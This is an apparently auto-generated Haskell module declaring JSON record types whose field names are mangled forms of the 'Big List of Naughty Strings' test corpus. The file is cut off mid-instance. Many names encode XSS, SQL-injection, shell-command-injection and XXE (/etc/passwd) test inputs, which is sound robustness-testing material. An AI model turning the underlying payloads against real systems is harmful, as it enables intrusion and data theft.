{-# LANGUAGE StrictData #-}
{-# LANGUAGE OverloadedStrings #-}

module QuickType
    ( QuickType (..)
    , A (..)
    , B (..)
    , C (..)
    , decodeTopLevel
    ) where

import Data.Aeson
import Data.Aeson.Types (emptyObject)
import Data.ByteString.Lazy (ByteString)
import Data.HashMap.Strict (HashMap)
import Data.Text (Text)

data QuickType = QuickType
    { aQuickType :: A
    , bQuickType :: B
    , cQuickType :: C
    } deriving (Show)

data A = A
    { _12A :: Text
    , _13A :: Text
    , _14A :: Text
    , _25A :: Text
    , _7A :: Text
    , _8A :: Text
    , _9A :: Text
    , aA :: Text
    , a0A :: Text
    , a00A :: Text
    , a000A :: Text
    , a0000A :: Text
    , a1A :: Text
    , a10A :: Text
    , a100000000A :: Text
    , a1E02A :: Text
    , aAlert123TA :: Text
    , aFalseA :: Text
    , aHrefJava123456781112ScriptJavascriptAlert1XXXAA :: Text
    , aHrefJavascriptX09JavascriptAlert1IDFuzzelement1TestAA :: Text
    , aHrefJavascriptX0AJavascriptAlert1IDFuzzelement1TestAA :: Text
    , aHrefJavascriptX3AJavascriptAlert1IDFuzzelement1TestAA :: Text
    , aHrefX01JavascriptJavascriptAlert1IDFuzzelement1TestAA :: Text
    , aHrefX05JavascriptJavascriptAlert1IDFuzzelement1TestAA :: Text
    , aHrefX08JavascriptJavascriptAlert1IDFuzzelement1TestAA :: Text
    , aHrefX09JavascriptJavascriptAlert1IDFuzzelement1TestAA :: Text
    , aHrefX0CjavascriptJavascriptAlert1IDFuzzelement1TestAA :: Text
    , aHrefX10JavascriptJavascriptAlert1IDFuzzelement1TestAA :: Text
    , aHrefX11JavascriptJavascriptAlert1IDFuzzelement1TestAA :: Text
    , aHrefX13JavascriptJavascriptAlert1IDFuzzelement1TestAA :: Text
    , aHrefX17JavascriptJavascriptAlert1IDFuzzelement1TestAA :: Text
    , aHrefX1FjavascriptJavascriptAlert1IDFuzzelement1TestAA :: Text
    , aHrefXC2XA0JavascriptJavascriptAlert1IDFuzzelement1TestAA :: Text
    , aHrefXE1X9AX80JavascriptJavascriptAlert1IDFuzzelement1TestAA :: Text
    , aHrefXE1XA0X8EjavascriptJavascriptAlert1IDFuzzelement1TestAA :: Text
    , aHrefXE2X80X83JavascriptJavascriptAlert1IDFuzzelement1TestAA :: Text
    , aHrefXE2X80X84JavascriptJavascriptAlert1IDFuzzelement1TestAA :: Text
    , aHrefXE2X80X86JavascriptJavascriptAlert1IDFuzzelement1TestAA :: Text
    , aHrefXE2X80X87JavascriptJavascriptAlert1IDFuzzelement1TestAA :: Text
    , aHrefXE2X80XA8JavascriptJavascriptAlert1IDFuzzelement1TestAA :: Text
    , aTestA :: Text
    , aTrueA :: Text
    , abcDivStyleXExpX00RessionJavascriptAlert1DEFA :: Text
    , abcDivStyleXExpX5CressionJavascriptAlert1DEFA :: Text
    , abcDivStyleXX09ExpressionJavascriptAlert1DEFA :: Text
    , abcDivStyleXX0BexpressionJavascriptAlert1DEFA :: Text
    , abcDivStyleXX20ExpressionJavascriptAlert1DEFA :: Text
    , abcDivStyleXX3AexpressionJavascriptAlert1DEFA :: Text
    , abcDivStyleXXC2XA0ExpressionJavascriptAlert1DEFA :: Text
    , abcDivStyleXXE2X80X80ExpressionJavascriptAlert1DEFA :: Text
    , abcDivStyleXXE2X80X84ExpressionJavascriptAlert1DEFA :: Text
    , abcDivStyleXXE2X80X89ExpressionJavascriptAlert1DEFA :: Text
    , abcDivStyleXXE2X80X8BexpressionJavascriptAlert1DEFA :: Text
    , alert123A :: Text
    , alert123TA :: Text
    , alertXSSA :: Text
    , ambitiousA :: Text
    , andU200BZEROWIDTHSPACEWhichAreInTheCCategoriesButAreOftenA :: Text
    , arsenalCanalA :: Text
    , autofocusOnkeyupJavascriptAlert123A :: Text
    , auxA :: Text
    , braggadociousA :: Text
    , changingLengthWhenLowercasedA :: Text
    , charactersWhichIncreaseInLength2To3BytesWhenLowercasedA :: Text
    , classicA :: Text
    , commandInjectionRubyA :: Text
    , cunningA :: Text
    , dA :: Text
    , dickVanDykeA :: Text
    , dontMakeAMapA :: Bool
    , drHermanILibshitzA :: Text
    , emptyA :: Text
    , envHomeA :: Text
    , etcHostsA :: Text
    , etcPasswd00A :: Text
    , falseA :: Text
    , fluffyA :: Text
    , fluffy0A :: Text
    , fluffyTestA :: Text
    , fontsAndHaveANumberOfSpecialBehaviorsA :: Text
    , fooValBarA :: Text
    , friskyA :: Text
    , hilariousA :: Text
    , homeA :: Text
    , humanInjectionA :: Text
    , iNVOkINGTHEFLINGOFCHOSA :: Text
    , ifImgSrcXOnerrorJavascriptAlert1A :: Text
    , ifScriptJavascriptAlert1ScriptA :: Text
    , imgSRCJavAscriptAlertXSSA :: Text
    , imgSRCJavX0AAscriptAlertXSSA :: Text
    , imgSRCJavX0DAscriptAlertXSSA :: Text
    , imgSrc106971189711599114105112116589710810111411640398883833941A :: Text
    , imgSrcX09XOnerrorJavascriptAlert1A :: Text
    , imgSrcX11XOnerrorJavascriptAlert1A :: Text
    , imgSrcXOnerrorX00JavascriptAlert1A :: Text
    , imgSrcXOnerrorX09JavascriptAlert1A :: Text
    , imgSrcXX09OnerrorJavascriptAlert1A :: Text
    , imgSrcXX10OnerrorJavascriptAlert1A :: Text
    , imgSrcXX11OnerrorJavascriptAlert1A :: Text
    , imgSrcXX12OnerrorJavascriptAlert1A :: Text
    , imgSrcXX13OnerrorJavascriptAlert1A :: Text
    , imgSrcXxxXX00OnerrorJavascriptAlert1A :: Text
    , imgSrcXxxXX0BonerrorJavascriptAlert1A :: Text
    , imgSrcXxxXX2FonerrorJavascriptAlert1A :: Text
    , imgX00SrcXOnerrorAlert1A :: Text
    , imgX10SrcXOnerrorJavascriptAlert1A :: Text
    , imgX13SrcXOnerrorJavascriptAlert1A :: Text
    , imgX32SrcXOnerrorJavascriptAlert1A :: Text
    , imgX39SrcXOnerrorJavascriptAlert1A :: Text
    , indecentA :: Text
    , indigoA :: Text
    , infA :: Text
    , infinityA :: Text
    , innocuousStringsWhichMayBeBlockedByProfanityFiltersHTTPSEnWikipediaOrgWikiScunthorpeProblemA :: Text
    , jimmyClitheroeA :: Text
    , kernelExit1A :: Text
    , knownCVEsAndVulnerabilitiesA :: Text
    , lightwaterCountryParkA :: Text
    , lpt2A :: Text
    , lpt3A :: Text
    , lsAlA :: Text
    , magentaA :: Text
    , mischievousA :: Text
    , msdosWindowsSpecialFilenamesA :: Text
    , nilA :: Text
    , nonWhitespaceC1ControlsU0080ThroughU0084AndU0086ThroughU009FA :: Text
    , noneA :: Text
    , nullA :: Text
    , onfocusJaVaSCriptAlert123AutofocusA :: Text
    , or11A :: Text
    , penistoneCommunityChurchA :: Text
    , perlEPrintIMGSRCJava0ScriptAlertXSSOutA :: Text
    , prnA :: Text
    , purpleA :: Text
    , purple0A :: Text
    , purple1A :: Text
    , purpleTestA :: Text
    , romansInSussexCoUkA :: Text
    , sA :: Text
    , sUnSUA :: Text
    , scScriptRiptAlert123ScScriptRiptA :: Text
    , scriptAlert123ScriptXA :: Text
    , scriptInjectionA :: Text
    , scriptSRCHTTPHaCkersOrgXSSJSBA :: Text
    , scriptSRCHTTPHaCkersOrgXSSJSSCRIPTA :: Text
    , scriptScriptAlert123ScriptA :: Text
    , scriptX00JavascriptAlert1ScriptA :: Text
    , scriptX09TypeTextJavascriptJavascriptAlert1ScriptA :: Text
    , scriptX0CjavascriptAlert1ScriptA :: Text
    , scriptX0DjavascriptAlert1ScriptA :: Text
    , scriptX20TypeTextJavascriptJavascriptAlert1ScriptA :: Text
    , scriptX3EtypeTextJavascriptJavascriptAlert1ScriptA :: Text
    , scriptXC2X85JavascriptAlert1ScriptA :: Text
    , scriptXC2XA0JavascriptAlert1ScriptA :: Text
    , scriptXE1X9AX80JavascriptAlert1ScriptA :: Text
    , scriptXE1XA0X8EjavascriptAlert1ScriptA :: Text
    , scriptXE2X80X81JavascriptAlert1ScriptA :: Text
    , scriptXE2X80X86JavascriptAlert1ScriptA :: Text
    , scriptXE2X80X89JavascriptAlert1ScriptA :: Text
    , scriptXE2X81X9FjavascriptAlert1ScriptA :: Text
    , scriptXEFXBBXBFjavascriptAlert1ScriptA :: Text
    , scriptXF0X90X96X9AjavascriptAlert1ScriptA :: Text
    , scriptXSSSRCHTTPHaCkersOrgXSSJSSCRIPTA :: Text
    , sqlInjectionA :: Text
    , stickyA :: Text
    , stringWhichCanRevealSystemFilesWhenParsedByABadlyConfiguredXMLParserA :: Text
    , stringsThatTestForKnownVulnerabilitiesA :: Text
    , stringsWhichCanBeAccidentallyExpandedIntoDifferentStringsIfEvaluatedInTheWrongContextEGUsedAsAPrintfFormatStringOrViaPERLOrShellEvalMightExposeSensitiveDataFromTheProgramDoingTheInterpolationOrMightJustRepresentTheWrongStringA :: Text
    , stringsWhichCanCallSystemCommandsWithinRubyRailsApplicationsA :: Text
    , stringsWhichConsistsOfJapaneseStyleEmoticonsWhichArePopularOnTheWebA :: Text
    , stringsWhichContainBoldItalicEtcVersionsOfNormalCharactersA :: Text
    , stringsWhichContainCommonUnicodeSymbolsEGSmartQuotesA :: Text
    , stringsWhichContainEmojiShouldBeTheSameBehaviorAsTwoByteCharactersButNotAlwaysA :: Text
    , stringsWhichContainMisplacedQuotationMarksCanCauseEncodingErrorsA :: Text
    , stringsWhichContainUnicodeSubscriptsSuperscriptsCanCauseRenderingIssuesA :: Text
    , stringsWhichCrashedIMessageInVariousVersionsOfIOSA :: Text
    , stringsWhichMayCauseHumanToReinterpretWorldviewA :: Text
    , superBowlXXXA :: Text
    , tentacledA :: Text
    , testA :: Text
    , textareaScriptAlert123ScriptA :: Text
    , the0A :: Text
    , the00A :: Text
    , the000A :: Text
    , the0000A :: Text
    , the0X0A :: Text
    , the1A :: Text
    , the10A :: Text
    , the100A :: Text
    , the1000A :: Text
    , the100000A :: Text
    , the100000000A :: Text
    , the11A :: Text
    , the12A :: Text
    , the123456789012345678901234567890123456789A :: Text
    , the15A :: Text
    , the16A :: Text
    , the17A :: Text
    , the18A :: Text
    , the19A :: Text
    , the1DROPTABLEUsersA :: Text
    , the1E02A :: Text
    , the1E2A :: Text
    , the1QnanA :: Text
    , the1SnanA :: Text
    , the2A :: Text
    , the20A :: Text
    , the21A :: Text
    , the22A :: Text
    , the23A :: Text
    , the24A :: Text
    , the26A :: Text
    , the27A :: Text
    , the3A :: Text
    , the4A :: Text
    , the5A :: Text
    , the6A :: Text
    , the999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999A :: Text
    , theNextTwoLinesMayAppearToBeBlankOrMojibakeInSomeViewersA :: Text
    , theQuicKBrownFoXBeeeepA :: Text
    , trueA :: Text
    , twoByteCharactersA :: Text
    , u0000U000AOrU000DNULLFCRA :: Text
    , uOncopyAlertCopyMeUA :: Text
    , undefA :: Text
    , unicodeFontA :: Text
    , unicodeNumbersA :: Text
    , unwantedInterpolationA :: Text
    , xLsAlA :: Text
    , zGOA :: Text
    } deriving (Show)

data B = B
    { _B :: Text
    , _2B :: Text
    , _3B :: Text
    , aHrefHTTPFooBarXYAImgAltImgSrcXXOnerrorJavascriptAlert1AB :: Text
    , aHrefJavascriptX00JavascriptAlert1IDFuzzelement1TestAB :: Text
    , aHrefJavascriptX0DJavascriptAlert1IDFuzzelement1TestAB :: Text
    , aHrefX02JavascriptJavascriptAlert1IDFuzzelement1TestAB :: Text
    , aHrefX04JavascriptJavascriptAlert1IDFuzzelement1TestAB :: Text
    , aHrefX0AjavascriptJavascriptAlert1IDFuzzelement1TestAB :: Text
    , aHrefX0DjavascriptJavascriptAlert1IDFuzzelement1TestAB :: Text
    , aHrefX0EjavascriptJavascriptAlert1IDFuzzelement1TestAB :: Text
    , aHrefX0FjavascriptJavascriptAlert1IDFuzzelement1TestAB :: Text
    , aHrefX16JavascriptJavascriptAlert1IDFuzzelement1TestAB :: Text
    , aHrefX19JavascriptJavascriptAlert1IDFuzzelement1TestAB :: Text
    , aHrefX1AjavascriptJavascriptAlert1IDFuzzelement1TestAB :: Text
    , aHrefX1DjavascriptJavascriptAlert1IDFuzzelement1TestAB :: Text
    , aHrefX1EjavascriptJavascriptAlert1IDFuzzelement1TestAB :: Text
    , aHrefXE2X80X81JavascriptJavascriptAlert1IDFuzzelement1TestAB :: Text
    , aHrefXE2X80X82JavascriptJavascriptAlert1IDFuzzelement1TestAB :: Text
    , aHrefXE2X80XA9JavascriptJavascriptAlert1IDFuzzelement1TestAB :: Text
    , aHrefXE2X80XAFjavascriptJavascriptAlert1IDFuzzelement1TestAB :: Text
    , abcDivStyleXExpressionX5CJavascriptAlert1DEFB :: Text
    , abcDivStyleXX0AexpressionJavascriptAlert1DEFB :: Text
    , abcDivStyleXX0DexpressionJavascriptAlert1DEFB :: Text
    , abcDivStyleXXE2X80X82ExpressionJavascriptAlert1DEFB :: Text
    , abcDivStyleXXE2X80X83ExpressionJavascriptAlert1DEFB :: Text
    , abcDivStyleXXE2X80X85ExpressionJavascriptAlert1DEFB :: Text
    , abcDivStyleXXE2X80X87ExpressionJavascriptAlert1DEFB :: Text
    , abcDivStyleXXE2X80X8AexpressionJavascriptAlert1DEFB :: Text
    , ambitiousB :: Text
    , appearInInputB :: Text
    , ath0B :: Text
    , autofocusOnkeyupJavascriptAlert123B :: Text
    , bB :: Text
    , b100000B :: Text
    , bIMGSRCOnmouseoverAlertXxsB :: Text
    , bScriptAlert123ScriptB :: Text
    , bTouchTmpBlnsFailB :: Text
    , basementB :: Text
    , braggadociousB :: Text
    , butNow20CforMyGreatestTrick8MB :: Text
    , byteOrderMarksUFEFFAndUFFFEEachOnItsOwnLineB :: Text
    , com1B :: Text
    , com3B :: Text
    , commonlyMisinterpretedAsAdditionalGraphicCharactersB :: Text
    , conB :: Text
    , contextsDividedIntoThreeGroupsBasedOnUSLayoutKeyboardPositionB :: Text
    , creditHTTPSTwitterCOMJifaStatus625776454479970304B :: Text
    , cunningB :: Text
    , devNullTouchTmpBlnsFailEchoB :: Text
    , dontMakeAMapB :: Bool
    , emptyB :: Text
    , evalPutsHelloWorldB :: Text
    , expressionB :: Text
    , falseB :: Text
    , fileB :: Text
    , fileInclusionB :: Text
    , fluffyB :: Text
    , fooValBarB :: Text
    , friskyB :: Text
    , generalCategoryCFInUnicode800B :: Text
    , hEWHOWATSBEHINDTHEWALB :: Text
    , helpB :: Text
    , hilariousB :: Text
    , httpA3030B :: Text
    , iOSVulnerabilitiesB :: Text
    , ifYouReReadingThisYouVeBeenInAComaForAlmost20YearsNowWeReTryingANewTechniqueWeDonTKnowWhereThisMessageWillEndUpInYourDreamButWeHopeItWorksPleaseWakeUpWeMissYouB :: Text
    , iframeSrcHTTPHaCkersOrgScriptletHTMLB :: Text
    , imgSRC14JavascriptAlertXSSB :: Text
    , imgSRCJavX09AscriptAlertXSSB :: Text
    , imgSRCOnmouseoverAlertXxsB :: Text
    , imgSRCX6AX61X76X61X73X63X72X69X70X74X3AX61X6CX65X72X74X28X27X58X53X53X27X29B :: Text
    , imgSrc00001060000097000011800000970000115000009900001140000105000011200001160000058000009700001080000101000011400001160000040000003900000880000083000008300000390000041B :: Text
    , imgSrcX00XOnerrorJavascriptAlert1B :: Text
    , imgSrcXOnerrorX11JavascriptAlert1B :: Text
    , imgSrcXOnerrorX12JavascriptAlert1B :: Text
    , imgSrcXxxXX0AonerrorJavascriptAlert1B :: Text
    , imgSrcXxxXX0ConerrorJavascriptAlert1B :: Text
    , imgSrcXxxXX0DonerrorJavascriptAlert1B :: Text
    , imgX00SrcXOnerrorJavascriptAlert1B :: Text
    , imgX11SrcXOnerrorJavascriptAlert1B :: Text
    , imgX12SrcXOnerrorJavascriptAlert1B :: Text
    , imgX47SrcXOnerrorJavascriptAlert1B :: Text
    , indecentB :: Text
    , indigoB :: Text
    , ircSpecificStringsB :: Text
    , japaneseEmoticonsB :: Text
    , kernelExecLsAlB :: Text
    , lindaCallahanB :: Text
    , magentaB :: Text
    , mischievousB :: Text
    , nblUOlopOqlNUnppuOdPosnOpPsLUsdpNsuoSOlopNsdOB :: Text
    , nilB :: Text
    , nulB :: Text
    , nullB :: Text
    , numericStringsB :: Text
    , oINVOKTHEHIVEMINDREPRESETINGCHAOSB :: Text
    , oftenForbiddenToAppearInVariousTextBasedFileFormatsEGXMLB :: Text
    , onfocusJaVaSCriptAlert123AutofocusB :: Text
    , or111B :: Text
    , purpleB :: Text
    , purpleScriptAlert123ScriptB :: Text
    , quotationMarksB :: Text
    , regionalIndicatorSymbolsB :: Text
    , regionalIndicatorSymbolsCanBeDisplayedDifferentlyAcrossB :: Text
    , reservedStringsB :: Text
    , scriptAlert123ScriptB :: Text
    , scriptAlert123ScriptXB :: Text
    , scriptAlertXSSSCRIPTB :: Text
    , scriptSRCHaCkersOrgJB :: Text
    , scriptSrcJscriptSScriptB :: Text
    , scriptX09JavascriptAlert1ScriptB :: Text
    , scriptX0AtypeTextJavascriptJavascriptAlert1ScriptB :: Text
    , scriptX0DtypeTextJavascriptJavascriptAlert1ScriptB :: Text
    , scriptX21JavascriptAlert1ScriptB :: Text
    , scriptX3BjavascriptAlert1ScriptB :: Text
    , scriptXE2X80X85JavascriptAlert1ScriptB :: Text
    , scriptXE2X80X87JavascriptAlert1ScriptB :: Text
    , scriptXE2X80X8AjavascriptAlert1ScriptB :: Text
    , scriptXE2X80XA8JavascriptAlert1ScriptB :: Text
    , scriptXE2X80XA9JavascriptAlert1ScriptB :: Text
    , scriptXE2X80XAFjavascriptAlert1ScriptB :: Text
    , scriptXE3X80X80JavascriptAlert1ScriptB :: Text
    , scunthorpeProblemB :: Text
    , stickyB :: Text
    , stringsThatMayOccurOnIRCClientsThatMakeSecurityProductsFreakOutB :: Text
    , stringsWhichAreReservedCharactersInMSDOSWindowsB :: Text
    , stringsWhichAttemptToInvokeABenignScriptInjectionShowsVulnerabilityToXSSB :: Text
    , stringsWhichContainTextThatShouldBeRenderedRTLIfPossibleEGArabicHebrewB :: Text
    , stringsWhichContainTwoByteCharactersCanCauseRenderingIssuesOrCharacterLengthIssuesB :: Text
    , stringsWhichContainUnicodeNumbersIfTheCodeIsLocalizedItShouldSeeTheInputAsNumericB :: Text
    , stringsWhichMayBeUsedElsewhereInCodeB :: Text
    , tentacledB :: Text
    , terminalEscapeCodesB :: Text
    , the000B :: Text
    , the01000B :: Text
    , the08B :: Text
    , the09B :: Text
    , the0XffffffffffffffffB :: Text
    , the1B :: Text
    , the100B :: Text
    , the1000B :: Text
    , the100000B :: Text
    , the100000000B :: Text
    , the1DROPTABLEUsers1B :: Text
    , the1IndB :: Text
    , the1InfB :: Text
    , the21474836481B :: Text
    , the22250738585072011E308B :: Text
    , theNextLineMayAppearToBeBlankMojibakeOrDingbatsInSomeViewersB :: Text
    , theNextLineMayAppearToBeBlankOrMojibakeInSomeViewersB :: Text
    , theNextLineMayBeFlaggedForTrailingWhitespaceInSomeViewersB :: Text
    , thisFileUnfortunatelyCannotExpressStringsContainingB :: Text
    , touchTmpBlnsFailB :: Text
    , touchTmpBlnsShellshock2FailB :: Text
    , tysonGayB :: Text
    , unicodeSymbolsB :: Text
    , x00ScriptJavascriptAlert1ScriptB :: Text
    , x3CscriptJavascriptAlert1ScriptB :: Text
    } deriving (Show)

data C = C
    { _C :: Text
    , _1C :: Text
    , _12C :: Text
    , _2C :: Text
    , _7C :: Text
    , aC :: Text
    , aHrefX00JavascriptJavascriptAlert1IDFuzzelement1TestAC :: Text
    , aHrefX03JavascriptJavascriptAlert1IDFuzzelement1TestAC :: Text
    , aHrefX06JavascriptJavascriptAlert1IDFuzzelement1TestAC :: Text
    , aHrefX07JavascriptJavascriptAlert1IDFuzzelement1TestAC :: Text
    , aHrefX0BjavascriptJavascriptAlert1IDFuzzelement1TestAC :: Text
    , aHrefX12JavascriptJavascriptAlert1IDFuzzelement1TestAC :: Text
    , aHrefX14JavascriptJavascriptAlert1IDFuzzelement1TestAC :: Text
    , aHrefX15JavascriptJavascriptAlert1IDFuzzelement1TestAC :: Text
    , aHrefX18JavascriptJavascriptAlert1IDFuzzelement1TestAC :: Text
    , aHrefX1BjavascriptJavascriptAlert1IDFuzzelement1TestAC :: Text
    , aHrefX1CjavascriptJavascriptAlert1IDFuzzelement1TestAC :: Text
    , aHrefX20JavascriptJavascriptAlert1IDFuzzelement1TestAC :: Text
    , aHrefXE2X80X80JavascriptJavascriptAlert1IDFuzzelement1TestAC :: Text
    , aHrefXE2X80X85JavascriptJavascriptAlert1IDFuzzelement1TestAC :: Text
    , aHrefXE2X80X88JavascriptJavascriptAlert1IDFuzzelement1TestAC :: Text
    , aHrefXE2X80X89JavascriptJavascriptAlert1IDFuzzelement1TestAC :: Text
    , aHrefXE2X80X8AjavascriptJavascriptAlert1IDFuzzelement1TestAC :: Text
    , aHrefXE2X81X9FjavascriptJavascriptAlert1IDFuzzelement1TestAC :: Text
    , aHrefXE3X80X80JavascriptJavascriptAlert1IDFuzzelement1TestAC :: Text
    , abcDivStyleXExpressionX00JavascriptAlert1DEFC :: Text
    , abcDivStyleXX00ExpressionJavascriptAlert1DEFC :: Text
    , abcDivStyleXX0CexpressionJavascriptAlert1DEFC :: Text
    , abcDivStyleXXE2X80X81ExpressionJavascriptAlert1DEFC :: Text
    , abcDivStyleXXE2X80X86ExpressionJavascriptAlert1DEFC :: Text
    , abcDivStyleXXE2X80X88ExpressionJavascriptAlert1DEFC :: Text
    , abcDivStyleXXE3X80X80ExpressionJavascriptAlert1DEFC :: Text
    , abcDivStyleXXEFXBBXBFexpressionJavascriptAlert1DEFC :: Text
    , ambitiousC :: Text
    , andU007FDELC :: Text
    , asciiPunctuationAllOfTheseCharactersMayNeedToBeEscapedInSomeC :: Text
    , bodyOnloadAlertXSSC :: Text
    , braggadociousC :: Text
    , cC :: Text
    , c00C :: Text
    , c000C :: Text
    , c100C :: Text
    , c100000C :: Text
    , c100000000C :: Text
    , c1E02C :: Text
    , cScriptAlert123ScriptC :: Text
    , clockC :: Text
    , com2C :: Text
    , com4C :: Text
    , craigCockburnSoftwareSpecialistC :: Text
    , cunningC :: Text
    , dccSendStartkeylogger000C :: Text
    , dontMakeAMapC :: Bool
    , emojiC :: Text
    , emptyC :: Text
    , evaluateC :: Text
    , fluffyC :: Text
    , fluffy00C :: Text
    , fooValBarC :: Text
    , friskyC :: Text
    , hENEZPERDIANHIVMINFCASZALGOC :: Text
    , hasOwnPropertyC :: Text
    , hilariousC :: Text
    , hornimanMuseumC :: Text
    , httpWWWCumQcCAC :: Text
    , iOnwheelAlert1ScrollOverMeIC :: Text
    , imgABCSrcDXEOnerrorFAlert1C :: Text
    , imgOnmouseoverAlertXxsC :: Text
    , imgSCRIPTAlertXSSSCRIPTC :: Text
    , imgSRCJavascriptAlertStringFromCharCode888383C :: Text
    , imgSRCJavascriptAlertXSSC :: Text
    , imgSrcOnerrorAltJavascriptAlert1C :: Text
    , imgSrcX10XOnerrorJavascriptAlert1C :: Text
    , imgSrcX12XOnerrorJavascriptAlert1C :: Text
    , imgSrcX13XOnerrorJavascriptAlert1C :: Text
    , imgSrcX32XOnerrorJavascriptAlert1C :: Text
    , imgSrcX47XOnerrorJavascriptAlert1C :: Text
    , imgSrcXOnerrorAlert123C :: Text
    , imgSrcXOnerrorX10JavascriptAlert1C :: Text
    , imgSrcXOnerrorX32JavascriptAlert1C :: Text
    , imgSrcXScriptJavascriptAlert1ScriptC :: Text
    , imgSrcXxxXX09OnerrorJavascriptAlert1C :: Text
    , imgSrcXxxXX20OnerrorJavascriptAlert1C :: Text
    , imgSrcXxxXX22OnerrorJavascriptAlert1C :: Text
    , imgSrcXxxXX27OnerrorJavascriptAlert1C :: Text
    , imgX11SrcXOnerrorJavascriptAlert1C :: Text
    , imgX34SrcXOnerrorJavascriptAlert1C :: Text
    , imgX47SrcXOnerrorJavascriptAlert1C :: Text
    , indecentC :: Text
    , indigoC :: Text
    , infinityC :: Text
    , javaSCriptAlert123C :: Text
    , lpt1C :: Text
    , ltScriptGtAlert3912339LtScriptGtC :: Text
    , magentaC :: Text
    , magnaCumLaudeC :: Text
    , medievalErectionOfParapetsC :: Text
    , mischievousC :: Text
    , mochaC :: Text
    , naNC :: Text
    , nonWhitespaceC0ControlsU0001ThroughU0008U000EThroughU001FC :: Text
    , nullC :: Text
    , onfocusJaVaSCriptAlert123AutofocusC :: Text
    , orReusedForInternalDelimitersOnTheTheoryThatTheyShouldNeverC :: Text
    , plaintextC :: Text
    , powerHC :: Text
    , purpleC :: Text
    , purple00C :: Text
    , purple100000C :: Text
    , purple100000000C :: Text
    , purpleScriptAlert123ScriptC :: Text
    , rightToLeftStringsC :: Text
    , rosesAre031Mred0MVioletsAre034MblueHopeYouEnjoyTerminalHueC :: Text
    , sC :: Text
    , scriptAlert123ScriptC :: Text
    , scriptAlert123ScriptXC :: Text
    , scriptJavascriptAlert1ScriptC :: Text
    , scriptScriptAlert123ScriptC :: Text
    , scriptSrcJscriptSScriptC :: Text
    , scriptX0AjavascriptAlert1ScriptC :: Text
    , scriptX0BjavascriptAlert1ScriptC :: Text
    , scriptX0CtypeTextJavascriptJavascriptAlert1ScriptC :: Text
    , scriptX20JavascriptAlert1ScriptC :: Text
    , scriptX2BjavascriptAlert1ScriptC :: Text
    , scriptX2FtypeTextJavascriptJavascriptAlert1ScriptC :: Text
    , scriptX7EjavascriptAlert1ScriptC :: Text
    , scriptXE2X80X80JavascriptAlert1ScriptC :: Text
    , scriptXE2X80X82JavascriptAlert1ScriptC :: Text
    , scriptXE2X80X83JavascriptAlert1ScriptC :: Text
    , scriptXE2X80X84JavascriptAlert1ScriptC :: Text
    , scriptXE2X80X88JavascriptAlert1ScriptC :: Text
    , scriptXE2X80X8BjavascriptAlert1ScriptC :: Text
    , scriptXEFXBFXAEjavascriptAlert1ScriptC :: Text
    , scriptXEFXBFXBEjavascriptAlert1ScriptC :: Text
    , scunthorpeGeneralHospitalC :: Text
    , serverCodeInjectionC :: Text
    , shitakeMushroomsC :: Text
    , specialCharactersC :: Text
    , srcJaVaSCriptPrompt132C :: Text
    , stickyC :: Text
    , stringsWhichCanBeInterpretedAsNumericC :: Text
    , stringsWhichCanCauseASQLInjectionIfInputsAreNotSanitizedC :: Text
    , stringsWhichCanCauseUserToPullInFilesThatShouldNotBeAPartOfAWebServerC :: Text
    , stringsWhichCanCauseUserToRunCodeOnServerAsAPrivilegedUserCFHTTPSNewsYcombinatorCOMItemID7665153C :: Text
    , stringsWhichContainCorruptedTextTheCorruptionWillNotAppearInNonHTMLTextHoweverViaHTTPWWWEeemoNetC :: Text
    , stringsWhichContainUnicodeWithAnUpsidedownEffectViaHTTPWWWUpsidedowntextCOMC :: Text
    , stringsWhichContainUnicodeWithUnusualPropertiesEGRightToLeftOverrideCFHTTPWWWUnicodeOrgChartsPDFU2000PDFC :: Text
    , stringsWhichPunishTheFoolsWhoUseCatTypeOnThisFileC :: Text
    , svgScript1231Alert123ScriptC :: Text
    , systemLsAlC :: Text
    , systemTouchTmpBlnsFailC :: Text
    , tentacledC :: Text
    , testC :: Text
    , testTestC :: Text
    , the0C :: Text
    , the00C :: Text
    , the000C :: Text
    , the0123456789C :: Text
    , the0TouchTmpBlnsShellshock1FailC :: Text
    , the0Xabad1DeaC :: Text
    , the0XffffffffC :: Text
    , the1C :: Text
    , the10C :: Text
    , the100C :: Text
    , the100000C :: Text
    , the100000000C :: Text
    , the11C :: Text
    , the12C :: Text
    , the13C :: Text
    , the1E02C :: Text
    , the1E2C :: Text
    , the1IndC :: Text
    , the3C :: Text
    , the4C :: Text
    , the5C :: Text
    , the6C :: Text
    , the8C :: Text
    , the9C :: Text
    , the92233720368547758081C :: Text
    , titleOnpropertychangeJavascriptAlert1TitleTitleTitleC :: Text
    , treatedAsWhitespaceInSomeContextsC :: Text
    , trickUnicodeC :: Text
    , trueC :: Text
    , undefinedC :: Text
    , unicodeAdditionalControlCharactersAllOfTheCharactersWithC :: Text
    , unicodeSubscriptSuperscriptAccentsC :: Text
    , unicodeUpsidedownC :: Text
    , userC :: Text
    , versionC :: Text
    , version800PlusU0009HTU000BVTU000CFFU0085NELC :: Text
    , whitespaceAllOfTheCharactersWithCategoryZsZlOrZpInUnicodeC :: Text
    , xmlVersion10EncodingISO88591DOCTYPEFooELEMENTFooANYENTITYXxeSYSTEMFileEtcPasswdFooXxeFooC :: Text
    , xxeInjectionXMLC :: Text
    , zalgoTextC :: Text
    , zzC :: Text
    } deriving (Show)

decodeTopLevel :: ByteString -> Maybe QuickType
decodeTopLevel = decode

instance ToJSON QuickType where
    toJSON (QuickType aQuickType bQuickType cQuickType) =
        object $ foldMap (maybe [] pure)
        [ Just $ "a" .= aQuickType
        , Just $ "b" .= bQuickType
        , Just $ "c" .= cQuickType
        ]

instance FromJSON QuickType where
    parseJSON (Object v) = QuickType
        <$> v .: "a"
        <*> v .: "b"
        <*> v .: "c"

instance ToJSON A where
